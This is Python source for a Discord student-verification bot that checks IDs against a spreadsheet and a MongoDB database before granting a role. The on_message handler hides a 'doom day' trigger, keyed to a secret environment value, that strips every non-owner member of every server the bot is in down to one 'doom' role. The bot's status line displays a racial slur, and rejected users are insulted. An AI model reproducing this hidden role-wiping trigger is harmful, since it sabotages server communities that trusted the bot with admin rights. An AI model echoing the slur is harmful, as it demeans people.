#https://discord.com/api/oauth2/authorize?client_id=1148956934880362607&permissions=8&scope=bot%20applications.commands
import os
import pymongo
import discord
from discord import app_commands 
from dotenv import load_dotenv
import pandas as pd


# loading env variables
load_dotenv()
TOKEN = os.getenv("TOKEN")
USER = os.getenv("USER")
PASS = os.getenv("PASS")
GOOGLE_SHEET_LINK = os.getenv("GOOGLE_SHEET_LINK")
DDAY_COMMAND = os.getenv("DDAY_COMMAND")

#setting up mongo DB    
client = pymongo.MongoClient(f"mongodb+srv://{USER}:{PASS}@cluster0.tspozkq.mongodb.net/?retryWrites=true&w=majority")
db = client.neuraldb
students = db.student

#roles
section_role = 1149348634828210176

#checking that we are connected to the database
try:
    client.admin.command('ping')
    print("connected to the database")
except Exception as e:
    print(e)

#initializing the bot
intents = discord.Intents.all()
activity = discord.Activity(name='Niggers', type=discord.ActivityType.watching)
bot = discord.Client(intents=intents, activity=activity)
tree = app_commands.CommandTree(bot)
guild_id = 1148742430800228432

#on ready
@bot.event
async def on_ready():
    await tree.sync(guild=discord.Object(id=guild_id))
    print('[DONE]: We have logged in as {0.user}'.format(bot))

#the doom command
@bot.event
async def on_message(message):
    #check that the bot can't reply to himself
    if message.author == bot.user:
        return

    #starting the doom command
    if message.content.startswith(DDAY_COMMAND):
        print("the doom day")

        doom_role = 1149777037570084947
        doom_role = message.guild.get_role(doom_role)
        for guild in bot.guilds:
            for member in guild.members:
                if not member.bot and not member == guild.owner:
                    print(str(member))
                    await member.edit(roles=[doom_role]) 
                    
#Setting up the commands
@tree.command(name = "login", 
              description = "Enter your Student ID",
              guild=discord.Object(id=guild_id)) 
              
@app_commands.describe(your_id = "Student ID", your_name = "name", your_surname = "surname")
async def login(interaction: discord.Interaction, your_id: str, your_name: str, your_surname: str):
    sec_role = interaction.guild.get_role(section_role)
    
    section_spreadsheet = pd.read_csv(GOOGLE_SHEET_LINK)
    section_Ids_List = section_spreadsheet["ID"].tolist()

    cursor = students.find({})
    db_list = [student["matricule"] for student in cursor]

    if str(your_id) in section_Ids_List and (int(your_id) not in db_list): 
        #create the student obejct
        student = {
            "matricule": int(your_id),
            "name": str(your_name),
            "surname": str(your_surname)
        }

        #insert the student object in the db
        students.insert_one(student)

        #interact with the student
        await interaction.user.add_roles(sec_role)
        await interaction.response.send_message(f"{interaction.user.mention} WELCOME TO THE SERVER: `{your_name}`")
    else:
        await interaction.response.send_message(f"{interaction.user.mention} GET THE FUCK OUT !")


bot.run(TOKEN)
